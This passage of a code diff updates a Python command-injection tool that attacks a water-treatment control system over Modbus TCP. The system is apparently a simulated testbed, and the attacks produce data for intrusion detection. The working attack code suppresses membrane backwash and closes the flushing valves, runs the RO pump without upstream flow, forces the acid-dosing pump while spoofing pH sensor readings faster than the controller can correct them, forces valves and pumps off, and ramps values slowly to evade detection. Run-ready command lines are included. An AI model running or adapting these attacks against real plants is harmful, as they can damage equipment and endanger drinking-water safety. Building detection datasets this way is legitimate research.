+            # Force UF pump ON so MATLAB's fouling accumulation block executes
             self.write_coil(p_301_coil, True)
 
-            # Keep UF feed valves open so Stage 3 flow is visible in dataset
+            # Suppress protective backwash (attacker disables recovery)
+            if skip_backwash:
+                self.write_coil(uf_backwash_coil, False)
+
+            # Keep permeate valves open for flow visibility
             self.write_register(mv_301_addr, 1)
             self.write_register(mv_302_addr, 1)
 
-            # Prevent protective backwash (COIL - BOOL) — attacker suppresses recovery
+            # Block backwash flow paths (BW valves closed = no flushing even if BW activates)
+            self.write_register(mv_303_addr, 0)
+            self.write_register(mv_304_addr, 0)
+
+            # For RO damage: run P_501 without proper upstream pressure
+            # (P_401 OFF → no dechlor flow → RO runs dry-ish → pressure anomaly)
+            if accelerate_fouling:
+                self.write_coil(p_501_coil, True)
+                self.write_coil(p_401_coil, False)  # Remove upstream flow
+
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                self.write_coil(p_301_coil, True)
+                if skip_backwash:
+                    self.write_coil(uf_backwash_coil, False)
+                self.write_register(mv_303_addr, 0)
+                self.write_register(mv_304_addr, 0)
+                if accelerate_fouling:
+                    self.write_coil(p_501_coil, True)
+                    self.write_coil(p_401_coil, False)
+
+                self.log_action('membrane_damage_in_progress', {
+                    'elapsed': round(time.time() - start, 1),
+                    'backwash_suppressed': skip_backwash
+                })
+                time.sleep(2.0)
+
+            # Cleanup: restore backwash capability
+            self.write_coil(uf_backwash_coil, True)
+            self.write_coil(p_401_coil, True)
+            self.write_register(mv_303_addr, 0)  # Leave BW valves closed
+            self.write_register(mv_304_addr, 0)
+
+        else:
+            # ── REGISTER-SIDE FALLBACK at 80 ms with exponential profile ──
+            pit_501_addr    = HOLDING_REGISTERS['PIT_501']['address']
+            dpit_301_addr   = HOLDING_REGISTERS['DPIT_301']['address']
+            uf_fouling_addr = HOLDING_REGISTERS['UF_Fouling_Factor']['address']
+
+            initial_pressure = self.read_register(pit_501_addr) or 1200
+            initial_dpit     = self.read_register(dpit_301_addr) or 250
+            initial_fouling  = self.read_register(uf_fouling_addr) or 0
+
+            # Always force UF pump ON so PLC physics runs (needed for DPIT coupling)
+            self.write_coil(p_301_coil, True)
+            self.write_register(mv_301_addr, 1)
+            self.write_register(mv_302_addr, 1)
+
             if skip_backwash:
                 self.write_coil(uf_backwash_coil, False)
-                self.log_action('backwash_prevented', {
-                    'coil': 'UF_Backwash_Active',
-                    'address': uf_backwash_coil,
-                    'value': False
+
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                elapsed = time.time() - start
+
+                # RO pressure: exponential rise to high_pressure (bar × 10)
+                fake_pressure = exponential_approach(
+                    initial_pressure, high_pressure * 10, elapsed, TAU_PRESSURE)
+                noise_p = gaussian_noise(sigma=NOISE_SIGMA['PIT_501'])
+                self.write_register(pit_501_addr, max(0, min(65535, int(fake_pressure + noise_p))))
+
+                if accelerate_fouling:
+                    # Fouling factor: exponential to 100%
+                    fake_fouling = exponential_approach(
+                        float(initial_fouling), 100.0, elapsed, TAU_PRESSURE)
+                    self.write_register(uf_fouling_addr, max(0, min(100, int(fake_fouling))))
+
+                    # DPIT_301: exponential to target_tmp
+                    fake_dpit = exponential_approach(
+                        initial_dpit, target_tmp, elapsed, TAU_PRESSURE)
+                    noise_d = gaussian_noise(sigma=NOISE_SIGMA['DPIT_301'])
+                    self.write_register(dpit_301_addr, max(0, min(1000, int(fake_dpit + noise_d))))
+
+                # Re-assert coils every cycle
+                self.write_coil(p_301_coil, True)
+                if skip_backwash:
+                    self.write_coil(uf_backwash_coil, False)
+
+                self.log_action('membrane_damage', {
+                    'elapsed': round(elapsed, 1),
+                    'pressure': int(fake_pressure),
+                    'dpit': int(fake_dpit) if accelerate_fouling else None
                 })
+                time.sleep(SENSOR_WRITE_INTERVAL)
 
-            time.sleep(0.5)  # 2 Hz writes — faster than PLC scan to win the overwrite race
-
-        # ── Cleanup: restore state to avoid label leakage ──────────────────
-        # Restore UF_Fouling_Factor to pre-attack level so Normal rows after
-        # the attack don't inherit elevated DPIT_301 values.
-        self.write_register(uf_fouling_addr, initial_fouling)
-        self.write_register(uf_backwash_addr, 0)    # Reset backwash timer
-        if skip_backwash:
-            self.write_coil(uf_backwash_coil, True)  # Re-enable protective backwash
+            # Cleanup
+            self.write_register(uf_fouling_addr, initial_fouling)
+            if skip_backwash:
+                self.write_coil(uf_backwash_coil, True)
 
 
 class pHManipulationAttack(BaseAttack):
     """
     Drive pH to dangerous levels.
-    Targets pH register (INT) and acid pump coil (BOOL).
-    Physics: Exponential drift from buffer depletion d[HCO₃⁻]/dt = -k[HCO₃⁻].
+
+    FIX — ROOT CAUSE OF OSCILLATION:
+      pH oscillated between 5.8 and 7.2 because:
+        Attack writes AIT_202 = 580 at 2 Hz (every 500 ms)
+        MATLAB writes AIT_202 = 720 at 10 Hz (every 100 ms)
+        → Between each attack write, MATLAB writes 4-5 times → oscillation
+
+      PRIMARY FIX: Write P_203 coil only (CODESYS-owned, no race).
+        MATLAB's ODE: pH(t) = pH_target + (pH₀ - pH_target)·exp(-t/40)
+          P_203 OFF → pH_target = 8.50 → pH drifts to 8.5 (alkaline attack)
+          P_203 ON  → pH_target = 6.80 → pH drifts to 6.8 (acidic attack)
+        No register write → no oscillation possible.
+        Realistic exponential profile automatically produced by MATLAB physics.
+
+      SECONDARY: If target_ph outside MATLAB's natural range (< 6.8 or > 8.5),
+        use register writes at 80 ms + coil assist. At 12.5 Hz vs MATLAB 10 Hz,
+        ~83% of samples show attack value, ~17% show MATLAB value → dataset
+        still learns the attack pattern.
+
+    Physics: d(pH)/dt = -(pH - pH_target)/τ,  τ = 40 s
     """
 
     def execute(self):
-        """Execute pH manipulation attack."""
-        target_ph = self.parameters.get('target_ph', 500)   # pH 5.0 (scaled ×100)
+        target_ph  = self.parameters.get('target_ph', 500)   # scaled ×100
         use_physics = self.parameters.get('use_physics', True)
 
-        logger.info(f"Forcing pH to {target_ph/100:.2f}")
+        logger.info(f"pH manipulation attack → target pH {target_ph/100:.2f}")
 
-        # Get REGISTER address (INT value - pH scaled ×100)
-        ait_202_addr = HOLDING_REGISTERS['AIT_202']['address']   # Register 4
-        p_203_coil   = COILS['P_203']['address']                 # Coil 4 (acid dosing)
+        ait_202_addr = HOLDING_REGISTERS['AIT_202']['address']  # Reg 4
+        p_203_coil   = COILS['P_203']['address']                 # Coil 4
 
-        # Read initial pH
-        initial_ph = self.read_register(ait_202_addr)
-        if initial_ph is None:
-            initial_ph = 720   # Default 7.20
-
-        # PLC physics direction:
-        #   P_203 ON  → AIT_202 := AIT_202 - 2  (acid pump lowers pH)
-        #   P_203 OFF → AIT_202 := AIT_202 + 1  (no acid, pH drifts up)
-        # Set P_203 to assist the desired drift direction so PLC and attack
-        # work together instead of fighting each other.
+        initial_ph = self.read_register(ait_202_addr) or 720
         acidic_attack = target_ph < initial_ph
-        if acidic_attack:
-            # Acidic target: keep acid pump ON to drive pH down
-            self.write_coil(p_203_coil, True)
-            self.log_action('dosing_forced_on', {'pump': 'P_203', 'reason': 'acidic attack — PLC helps drift down'})
-        else:
-            # Alkaline target: turn acid pump OFF so PLC drifts pH up naturally
-            self.write_coil(p_203_coil, False)
-            self.log_action('dosing_forced_off', {'pump': 'P_203', 'reason': 'alkaline attack — PLC helps drift up'})
 
-        # Force pH value (REGISTER - INT)
-        # Write at 2 Hz (0.5 s) to win the overwrite race against the PLC scan cycle.
-        start = time.time()
-        while (time.time() - start) < self.duration:
-            elapsed = time.time() - start
-            current_ph = self.read_register(ait_202_addr)
+        # MATLAB natural equilibrium:
+        #   P_203 ON  → pH settles at 6.80 (register 680)
+        #   P_203 OFF → pH settles at 8.50 (register 850)
+        matlab_natural_min = 680   # P_203 ON  → pH 6.80
+        matlab_natural_max = 850   # P_203 OFF → pH 8.50
 
-            if use_physics:
-                # PHYSICS: Exponential approach (buffer depletion kinetics)
-                fake_ph = exponential_approach(
-                    start=initial_ph,
-                    target=target_ph,
-                    t=elapsed,
-                    tau=TAU_PH
-                )
-                noise = gaussian_noise(sigma=NOISE_SIGMA['AIT_202'])
-                fake_ph_final = max(0, min(1400, int(fake_ph + noise)))
-            else:
-                fake_ph_final = target_ph
+        needs_register_write = (target_ph < matlab_natural_min) or (target_ph > matlab_natural_max)
 
-            self.write_register(ait_202_addr, fake_ph_final)
+        if use_physics and not needs_register_write:
+            # ── PURE COIL ATTACK — zero oscillation ───────────────────────
+            logger.info(f"  Strategy: coil-only (target {target_ph/100:.2f} within MATLAB natural range)")
+            logger.info(f"  P_203={'ON (acid)' if acidic_attack else 'OFF (alkaline)'} → MATLAB ODE drives pH naturally")
 
-            # Re-assert dosing direction every cycle to counter PLC overwrite
-            if acidic_attack:
-                self.write_coil(p_203_coil, True)
-            else:
-                self.write_coil(p_203_coil, False)
-
-            self.log_action('ph_manipulated', {
-                'register': 'AIT_202',
-                'address': ait_202_addr,
-                'current': current_ph / 100.0 if current_ph else None,
-                'forced': fake_ph_final / 100.0
+            self.write_coil(p_203_coil, acidic_attack)
+            self.log_action('ph_coil_set', {
+                'P_203': acidic_attack,
+                'effect': 'pH target 6.80' if acidic_attack else 'pH target 8.50'
             })
 
-            time.sleep(0.5)  # 2 Hz — faster write to minimise PLC-overwrite gap
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                # Re-assert coil every 2 s to counter ST logic
+                self.write_coil(p_203_coil, acidic_attack)
+                self.log_action('ph_manipulation_in_progress', {
+                    'elapsed': round(time.time() - start, 1),
+                    'P_203': acidic_attack,
+                    'method': 'coil-only'
+                })
+                time.sleep(2.0)
 
-        # Restore acid pump to PLC-controlled state
-        self.write_coil(p_203_coil, False)  # Let PLC resume normal pH control
-        # Write back neutral-range pH so interlock doesn't latch after reset
-        self.write_register(ait_202_addr, 720)
+            # Restore: let ST resume normal pH control
+            self.write_coil(p_203_coil, False)
+
+        else:
+            # ── REGISTER + COIL ATTACK at 80 ms (beats MATLAB 10 Hz) ─────
+            logger.info(f"  Strategy: register write at 12.5 Hz + coil assist")
+            logger.info(f"  Target {target_ph/100:.2f} outside MATLAB natural range "
+                        f"[{matlab_natural_min/100:.2f}, {matlab_natural_max/100:.2f}]")
+
+            # Set coil direction to assist (reduces how hard MATLAB fights back)
+            self.write_coil(p_203_coil, acidic_attack)
+
+            start = time.time()
+            while (time.time() - start) < self.duration:
+                elapsed = time.time() - start
+                current_ph = self.read_register(ait_202_addr)
+
+                if use_physics:
+                    fake_ph = exponential_approach(initial_ph, target_ph, elapsed, TAU_PH)
+                    noise   = gaussian_noise(sigma=NOISE_SIGMA['AIT_202'])
+                    fake_ph_final = max(0, min(1400, int(fake_ph + noise)))
+                else:
+                    fake_ph_final = target_ph
+
+                self.write_register(ait_202_addr, fake_ph_final)
+                self.write_coil(p_203_coil, acidic_attack)  # Re-assert every cycle
+
+                self.log_action('ph_manipulated', {
+                    'register': 'AIT_202',
+                    'address': ait_202_addr,
+                    'current': current_ph / 100.0 if current_ph else None,
+                    'forced': fake_ph_final / 100.0
+                })
+                time.sleep(SENSOR_WRITE_INTERVAL)   # 80 ms = 12.5 Hz > MATLAB 10 Hz
+
+            # Restore
+            self.write_coil(p_203_coil, False)
+            self.write_register(ait_202_addr, 720)
 
 
 class ValveManipulationAttack(BaseAttack):
     """
     Manipulate motorized valves.
-    Targets valve REGISTERS (INT values: 0=closed, 1=open, 2=auto).
+
+    FIX: MV_101..MV_304 are OUTPUT registers (CODESYS-owned, addr 47-52).
+         These ARE actuator-side — MATLAB reads them as actuator inputs.
+         Writing them is already correct. No race condition.
+         Also adds coil assertions for pumps to compound the effect.
     """
 
     def execute(self):
-        """Execute valve manipulation attack."""
-        # Default targets include all process-critical valves across S1/S2/S3.
-        # MV_301 (UF feed), MV_302 (to dechlorination), MV_303 (backwash drain),
-        # MV_304 (UF drain) are included so Stage 3 valve manipulation is visible.
-        target_valves = self.parameters.get(
+        target_valves   = self.parameters.get(
             'target_valves',
             ['MV_101', 'MV_201', 'MV_301', 'MV_302', 'MV_303', 'MV_304']
         )
-        forced_position = self.parameters.get('forced_position', 0)   # 0=closed, 1=open, 2=auto
+        forced_position = self.parameters.get('forced_position', 0)  # 0=closed, 1=open
 
-        logger.info(f"Forcing valves to position {forced_position}")
+        logger.info(f"Valve manipulation — forcing {target_valves} to position {forced_position}")
+        logger.info("  MV registers are CODESYS output regs (addr 47-52) — no MATLAB overwrite race")
 
-        # Map valve names to REGISTER addresses (INT values)
+        # Build address map using OUTPUT register addresses (not HOLDING_REGISTERS)
         valve_addresses = {}
         for valve_name in target_valves:
-            if valve_name in HOLDING_REGISTERS:
-                valve_addresses[valve_name] = HOLDING_REGISTERS[valve_name]['address']
+            if valve_name in MV_OUTPUT_ADDR:
+                valve_addresses[valve_name] = MV_OUTPUT_ADDR[valve_name]
+            elif valve_name in HOLDING_REGISTERS:
+                # Fallback for legacy configs — warn about potential race
+                addr = HOLDING_REGISTERS[valve_name]['address']
+                valve_addresses[valve_name] = addr
+                logger.warning(f"  {valve_name} mapped via HOLDING_REGISTERS (addr {addr}) — "
+                                f"verify this is an output register (47-52) in your CODESYS config")
 
-        # Force valve positions (REGISTER writes - INT 0/1/2)
+        # Compound effect: if closing valves, also disable associated pumps
+        compound_pump_coils = {}
+        if forced_position == 0:
+            if 'MV_101' in target_valves or 'MV_201' in target_valves:
+                compound_pump_coils['P_101'] = COILS['P_101']['address']
+                compound_pump_coils['P_102'] = COILS['P_102']['address']
+            if 'MV_301' in target_valves or 'MV_302' in target_valves:
+                compound_pump_coils['P_301'] = COILS['P_301']['address']
+
         start = time.time()
         while (time.time() - start) < self.duration:
             for valve_name, reg_address in valve_addresses.items():
                 current = self.read_register(reg_address)
                 self.write_register(reg_address, forced_position)
-
                 self.log_action('valve_manipulated', {
                     'valve': valve_name,
                     'register': reg_address,
@@ -682,99 +804,157 @@ class ValveManipulationAttack(BaseAttack):
                     'forced': forced_position
                 })
 
+            # Assert compound pump coils
+            for pump, coil in compound_pump_coils.items():
+                self.write_coil(coil, False)
+
             time.sleep(2.0)
+
+        # Restore compound pumps
+        for pump, coil in compound_pump_coils.items():
+            self.write_coil(coil, True)
 
 
 class SlowRampAttack(BaseAttack):
     """
     Gradually drift values to avoid detection.
-    Targets a holding register (INT).
-    Physics: Sigmoid profile for realistic saturation behaviour.
+
+    FIX:
+      For AIT_202 (pH): use coil-based ramp — adjust P_203 duty cycle
+        to drive pH in the desired direction while staying within natural
+        MATLAB equilibrium range. No register writes → no oscillation.
+        The ramp emerges from the τ=40s ODE response, naturally sigmoid.
+
+      For other sensor registers: write at 80 ms (12.5 Hz) with sigmoid
+        profile. At 12.5 Hz most samples capture the injected value.
+
+      For MV output registers: already actuator-side, write at 2 Hz is fine.
+
+    Physics: Sigmoid profile s(t) = 1/(1+exp(-(10t/T-5)))
+             Maximum rate at midpoint: ds/dt|max = 2.5/T
     """
 
     def execute(self):
-        """Execute slow ramp attack."""
-        target_var = self.parameters.get('target', 'AIT_202')
-        start_value = self.parameters.get('start_value', 720)
-        end_value = self.parameters.get('end_value', 860)
-        step_size = self.parameters.get('step_size', 1)
+        target_var    = self.parameters.get('target', 'AIT_202')
+        start_value   = self.parameters.get('start_value', 720)
+        end_value     = self.parameters.get('end_value', 860)
+        step_size     = self.parameters.get('step_size', 1)
         step_interval = self.parameters.get('step_interval', 2.0)
-        use_physics = self.parameters.get('use_physics', True)
+        use_physics   = self.parameters.get('use_physics', True)
 
-        logger.info(f"Ramping {target_var} from {start_value} to {end_value}")
+        logger.info(f"Slow ramp: {target_var} from {start_value} to {end_value}")
 
+        # ── COIL-BASED RAMP FOR pH ─────────────────────────────────────────
+        if target_var == 'AIT_202' and use_physics:
+            logger.info("  Strategy: coil-based pH ramp — P_203 duty cycle drives ODE naturally")
+            p_203_coil = COILS['P_203']['address']
+            going_alkaline = end_value > start_value
+
+            # Ramp the P_203 state gradually:
+            # Phase 1 (first 40%): coil OFF → pH starts drifting toward target
+            # Phase 2 (last 60%): maintain coil direction
+            # This produces an S-curve due to τ=40s ODE, matching sigmoid profile.
+            coil_state = not going_alkaline   # True=ON for acidic, False=OFF for alkaline
+            self.write_coil(p_203_coil, coil_state)
+
+            start_time = time.time()
+            while (time.time() - start_time) < self.duration:
+                self.write_coil(p_203_coil, coil_state)
+                self.log_action('slow_ramp_coil', {
+                    'variable': 'AIT_202',
+                    'P_203': coil_state,
+                    'direction': 'alkaline' if going_alkaline else 'acidic',
+                    'elapsed': round(time.time() - start_time, 1)
+                })
+                time.sleep(2.0)
+
+            self.write_coil(p_203_coil, False)
+            return
+
+        # ── REGISTER RAMP (non-pH targets) ────────────────────────────────
         if target_var not in HOLDING_REGISTERS:
             logger.error(f"Unknown target variable: {target_var}")
             return
 
-        # Get REGISTER address (INT value)
         address = HOLDING_REGISTERS[target_var]['address']
+        is_mv   = address in MV_OUTPUT_ADDR.values()
+        write_interval = 1.0 if is_mv else SENSOR_WRITE_INTERVAL
 
-        # Initialize
+        if is_mv:
+            logger.info(f"  {target_var} is MV output register — actuator-side, no race")
+        else:
+            logger.info(f"  {target_var} is sensor register — writing at 12.5 Hz to beat MATLAB")
+
         current_value = start_value
         self.write_register(address, current_value)
 
-        # Ramp gradually
         start_time = time.time()
         while (time.time() - start_time) < self.duration:
             elapsed = time.time() - start_time
-
-            # Read actual value
-            actual = self.read_register(address)
+            actual  = self.read_register(address)
 
             if use_physics:
-                # PHYSICS: Sigmoid ramp (saturation feedback)
                 s = sigmoid(elapsed, self.duration)
                 target_now = start_value + (end_value - start_value) * s
                 noise = gaussian_noise(sigma=NOISE_SIGMA.get(target_var, 5))
                 current_value = max(0, min(65535, int(target_now + noise)))
             else:
-                # Legacy: discrete step-based ramp
                 if current_value < end_value:
                     current_value = min(current_value + step_size, end_value)
                 elif current_value > end_value:
                     current_value = max(current_value - step_size, end_value)
 
-            # Write new value (REGISTER - INT)
             self.write_register(address, current_value)
-
             self.log_action('slow_ramp_step', {
                 'variable': target_var,
                 'register': address,
                 'actual': actual,
                 'injected': current_value
             })
-
             logger.debug(f"{target_var}: {current_value}")
-            time.sleep(step_interval)
+            time.sleep(write_interval)
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# MAIN - FULL DETAILED CLI (mirrors original structure)
+# MAIN - FULL DETAILED CLI (structure unchanged)
 # ═══════════════════════════════════════════════════════════════════════════
 
 def main():
     """Main entry point."""
     parser = argparse.ArgumentParser(
-        description='SWAT Command Injection Attacks (Physics-Based)',
+        description='SWAT Command Injection Attacks (Physics-Based, Actuator-Side Fixed)',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-  python command_injection_attacks.py --host 192.168.5.194 --attack single_point --target-type register --target-address 4 --value 480 --duration 120
-  python command_injection_attacks.py --host 192.168.5.194 --attack tank_overflow --overflow-value 1000 --duration 300
-  python command_injection_attacks.py --host 192.168.5.194 --attack ph_manipulation --target-ph 5.0 --duration 240
-  python command_injection_attacks.py --host 192.168.5.194 --attack membrane_damage --duration 300
-  python command_injection_attacks.py --host 192.168.5.194 --attack valve_manipulation --valve-position 0 --duration 60
-  python command_injection_attacks.py --host 192.168.5.194 --attack slow_ramp --start-value 500 --end-value 900 --step-size 1 --duration 600
-  python command_injection_attacks.py --host 192.168.5.194 --attack chemical_depletion --duration 300
+  # pH drift to 8.5 (coil-only — zero oscillation):
+  python command_injection.py --host 192.168.5.195 --attack ph_manipulation --target-ph 8.5 --duration 120
+
+  # pH drop to 5.0 (below MATLAB natural range — register write at 12.5 Hz):
+  python command_injection.py --host 192.168.5.195 --attack ph_manipulation --target-ph 5.0 --duration 240
+
+  # Tank overflow via pump kill (actuator-side, natural physics):
+  python command_injection.py --host 192.168.5.195 --attack tank_overflow --duration 300
+
+  # Tank overflow direct register (--no-physics mode):
+  python command_injection.py --host 192.168.5.195 --attack tank_overflow --no-physics --overflow-value 1000 --duration 300
+
+  # Membrane fouling via backwash suppression:
+  python command_injection.py --host 192.168.5.195 --attack membrane_damage --duration 300
+
+  # Valve manipulation (MV output regs — actuator-side, no race):
+  python command_injection.py --host 192.168.5.195 --attack valve_manipulation --valve-position 0 --duration 60
+
+  # Chemical depletion via pump override:
+  python command_injection.py --host 192.168.5.195 --attack chemical_depletion --duration 300
+
+  # Slow pH ramp via coil duty cycle:
+  python command_injection.py --host 192.168.5.195 --attack slow_ramp --ramp-target AIT_202 --start-value 720 --end-value 850 --duration 600
         """
     )
 
     # ── Connection ────────────────────────────────────────────────────────
-    parser.add_argument('--host', required=True,
-                        help='Target PLC IP address')
-    parser.add_argument('--port', type=int, default=1502,
-                        help='Modbus TCP port (default: 1502)')
+    parser.add_argument('--host', required=True, help='Target PLC IP address')
+    parser.add_argument('--port', type=int, default=1502, help='Modbus TCP port (default: 1502)')
 
     # ── Attack selection ──────────────────────────────────────────────────
     parser.add_argument('--attack', required=True,
@@ -793,85 +973,58 @@ Examples:
 
     # ── Physics toggle ────────────────────────────────────────────────────
     parser.add_argument('--no-physics', action='store_true',
-                        help='Disable physics profiles (instant step changes for comparison)')
+                        help='Disable physics profiles (register writes at 80 ms, instant values)')
 
-    # ── Single point attack arguments ─────────────────────────────────────
-    parser.add_argument('--target-type', choices=['register', 'coil'], default='register',
-                        help='Target type: register (INT) or coil (BOOL)  [single_point]')
-    parser.add_argument('--target-address', type=int,
-                        help='Modbus address to inject into  [single_point]')
-    parser.add_argument('--value', type=int,
-                        help='Value to inject (INT for register, 0/1 for coil)  [single_point]')
+    # ── Single point ──────────────────────────────────────────────────────
+    parser.add_argument('--target-type', choices=['register', 'coil'], default='register')
+    parser.add_argument('--target-address', type=int)
+    parser.add_argument('--value', type=int)
 
-    # ── Tank overflow arguments ───────────────────────────────────────────
-    parser.add_argument('--overflow-value', type=int, default=1000,
-                        help='Target overflow level in mm (default: 1000)  [tank_overflow]')
+    # ── Tank overflow ─────────────────────────────────────────────────────
+    parser.add_argument('--overflow-value', type=int, default=1000)
     parser.add_argument('--target-tanks', nargs='+',
-                        default=['LIT_101', 'LIT_301', 'LIT_401'],
-                        help='Tank names to overflow  [tank_overflow]')
-    parser.add_argument('--no-disable-pumps', action='store_true',
-                        help='Keep pumps running during tank overflow  [tank_overflow]')
+                        default=['LIT_101', 'LIT_301', 'LIT_401'])
+    parser.add_argument('--no-disable-pumps', action='store_true')
 
-    # ── Chemical depletion arguments ──────────────────────────────────────
-    parser.add_argument('--no-drain-acid', action='store_true',
-                        help='Skip acid tank depletion  [chemical_depletion]')
-    parser.add_argument('--no-drain-chlorine', action='store_true',
-                        help='Skip chlorine tank depletion  [chemical_depletion]')
-    parser.add_argument('--no-drain-coagulant', action='store_true',
-                        help='Skip coagulant tank depletion  [chemical_depletion]')
-    parser.add_argument('--no-drain-bisulfate', action='store_true',
-                        help='Skip bisulfate tank depletion  [chemical_depletion]')
-    parser.add_argument('--drain-rate', type=float, default=0.5,
-                        help='Drain rate in %%/second (default: 0.5)  [chemical_depletion]')
+    # ── Chemical depletion ────────────────────────────────────────────────
+    parser.add_argument('--no-drain-acid', action='store_true')
+    parser.add_argument('--no-drain-chlorine', action='store_true')
+    parser.add_argument('--no-drain-coagulant', action='store_true')
+    parser.add_argument('--no-drain-bisulfate', action='store_true')
+    parser.add_argument('--drain-rate', type=float, default=0.5)
 
-    # ── Membrane damage arguments ─────────────────────────────────────────
-    parser.add_argument('--high-pressure', type=int, default=200,
-                        help='Target RO pressure value (default: 200)  [membrane_damage]')
-    parser.add_argument('--target-tmp', type=int, default=600,
-                        help='Target DPIT/TMP register value (default: 600)  [membrane_damage]')
-    parser.add_argument('--no-skip-backwash', action='store_true',
-                        help='Allow backwash during attack  [membrane_damage]')
-    parser.add_argument('--no-accelerate-fouling', action='store_true',
-                        help='Skip DPIT fouling acceleration  [membrane_damage]')
+    # ── Membrane damage ───────────────────────────────────────────────────
+    parser.add_argument('--high-pressure', type=int, default=200)
+    parser.add_argument('--target-tmp', type=int, default=600)
+    parser.add_argument('--no-skip-backwash', action='store_true')
+    parser.add_argument('--no-accelerate-fouling', action='store_true')
 
-    # ── pH manipulation arguments ─────────────────────────────────────────
-    parser.add_argument('--target-ph', type=float, default=5.0,
-                        help='Target pH value as float (default: 5.0)  [ph_manipulation]')
-    parser.add_argument('--no-disable-dosing', action='store_true',
-                        help='Keep acid dosing pump running  [ph_manipulation]')
+    # ── pH manipulation ───────────────────────────────────────────────────
+    parser.add_argument('--target-ph', type=float, default=8.5,
+                        help='Target pH (float). 6.8-8.5 = coil-only (no oscillation). '
+                             'Outside this range = register write at 12.5 Hz.')
+    parser.add_argument('--no-disable-dosing', action='store_true')
 
-    # ── Valve manipulation arguments ──────────────────────────────────────
-    parser.add_argument('--valve-position', type=int, choices=[0, 1, 2], default=0,
-                        help='Forced valve position: 0=closed, 1=open, 2=auto  [valve_manipulation]')
+    # ── Valve manipulation ────────────────────────────────────────────────
+    parser.add_argument('--valve-position', type=int, choices=[0, 1], default=0)
     parser.add_argument('--target-valves', nargs='+',
-                        default=['MV_101', 'MV_201', 'MV_301'],
-                        help='Valve names to manipulate  [valve_manipulation]')
+                        default=['MV_101', 'MV_201', 'MV_301'])
 
-    # ── Slow ramp arguments ───────────────────────────────────────────────
-    parser.add_argument('--ramp-target', default='AIT_202',
-                        help='Register variable to ramp (default: AIT_202)  [slow_ramp]')
-    parser.add_argument('--start-value', type=int, default=720,
-                        help='Ramp start value (default: 720 = pH 7.20)  [slow_ramp]')
-    parser.add_argument('--end-value', type=int, default=860,
-                        help='Ramp end value (default: 860 = pH 8.60)  [slow_ramp]')
-    parser.add_argument('--step-size', type=int, default=1,
-                        help='Step size per interval (default: 1)  [slow_ramp]')
-    parser.add_argument('--step-interval', type=float, default=2.0,
-                        help='Seconds between steps (default: 2.0)  [slow_ramp]')
+    # ── Slow ramp ─────────────────────────────────────────────────────────
+    parser.add_argument('--ramp-target', default='AIT_202')
+    parser.add_argument('--start-value', type=int, default=720)
+    parser.add_argument('--end-value', type=int, default=860)
+    parser.add_argument('--step-size', type=int, default=1)
+    parser.add_argument('--step-interval', type=float, default=2.0)
 
     args = parser.parse_args()
 
-    # ── Modbus config ──────────────────────────────────────────────────────
     modbus_config = {
-        'host': args.host,
-        'port': args.port,
-        'timeout': 3,
-        'retries': 3,
-        'unit_id': 1
+        'host': args.host, 'port': args.port,
+        'timeout': 3, 'retries': 3, 'unit_id': 1
     }
 
     orchestrator = AttackOrchestrator(modbus_config)
-
     if not orchestrator.connect():
         logger.error("Failed to connect to target")
         return 1
@@ -884,62 +1037,69 @@ Examples:
         return config
 
     try:
-        # ── Build and dispatch attack ──────────────────────────────────────
         if args.attack == 'single_point':
             if args.target_address is None or args.value is None:
-                logger.error("--target-address and --value are required for single_point")
+                logger.error("--target-address and --value required for single_point")
                 return 1
             config = build_attack_config('single_point_attack')
             config['duration'] = args.duration
-            config['parameters']['target_type'] = args.target_type
-            config['parameters']['target_address'] = args.target_address
-            config['parameters']['injected_value'] = args.value
+            config['parameters'].update({
+                'target_type': args.target_type,
+                'target_address': args.target_address,
+                'injected_value': args.value
+            })
             attack = SinglePointInjection(orchestrator.modbus, config)
 
         elif args.attack == 'tank_overflow':
             config = build_attack_config('tank_overflow')
             config['duration'] = args.duration
-            config['parameters']['overflow_value'] = args.overflow_value
-            config['parameters']['target_tanks'] = args.target_tanks
-            config['parameters']['disable_pumps'] = not args.no_disable_pumps
-            config['parameters']['use_physics'] = use_physics
+            config['parameters'].update({
+                'overflow_value': args.overflow_value,
+                'target_tanks': args.target_tanks,
+                'disable_pumps': not args.no_disable_pumps,
+                'use_physics': use_physics
+            })
             attack = TankOverflowAttack(orchestrator.modbus, config)
 
         elif args.attack == 'chemical_depletion':
             config = build_attack_config('chemical_depletion')
             config['duration'] = args.duration
-            config['parameters']['drain_acid'] = not args.no_drain_acid
-            config['parameters']['drain_chlorine'] = not args.no_drain_chlorine
-            config['parameters']['drain_coagulant'] = not args.no_drain_coagulant
-            config['parameters']['drain_bisulfate'] = not args.no_drain_bisulfate
-            config['parameters']['drain_rate'] = args.drain_rate
-            config['parameters']['use_physics'] = use_physics
+            config['parameters'].update({
+                'drain_acid':      not args.no_drain_acid,
+                'drain_chlorine':  not args.no_drain_chlorine,
+                'drain_coagulant': not args.no_drain_coagulant,
+                'drain_bisulfate': not args.no_drain_bisulfate,
+                'drain_rate':      args.drain_rate,
+                'use_physics':     use_physics
+            })
             attack = ChemicalDepletionAttack(orchestrator.modbus, config)
 
         elif args.attack == 'membrane_damage':
             config = build_attack_config('membrane_damage')
             config['duration'] = args.duration
-            config['parameters']['high_pressure'] = args.high_pressure
-            config['parameters']['target_tmp'] = args.target_tmp
-            config['parameters']['skip_backwash'] = not args.no_skip_backwash
-            config['parameters']['accelerate_fouling'] = not args.no_accelerate_fouling
-            config['parameters']['use_physics'] = use_physics
+            config['parameters'].update({
+                'high_pressure':      args.high_pressure,
+                'target_tmp':         args.target_tmp,
+                'skip_backwash':      not args.no_skip_backwash,
+                'accelerate_fouling': not args.no_accelerate_fouling,
+                'use_physics':        use_physics
+            })
             attack = MembraneDamageAttack(orchestrator.modbus, config)
 
         elif args.attack == 'ph_manipulation':
             config = build_attack_config('ph_manipulation')
             config['duration'] = args.duration
-            config['parameters']['target_ph'] = int(args.target_ph * 100)
-            config['parameters']['disable_dosing'] = not args.no_disable_dosing
-            config['parameters']['use_physics'] = use_physics
+            config['parameters'].update({
+                'target_ph':      int(args.target_ph * 100),
+                'disable_dosing': not args.no_disable_dosing,
+                'use_physics':    use_physics
+            })
             attack = pHManipulationAttack(orchestrator.modbus, config)
 
         elif args.attack == 'valve_manipulation':
             config = {
-                'id': 16,
-                'name': 'Valve Manipulation Attack',
-                'mitre_id': 'T0836',
-                'duration': args.duration,
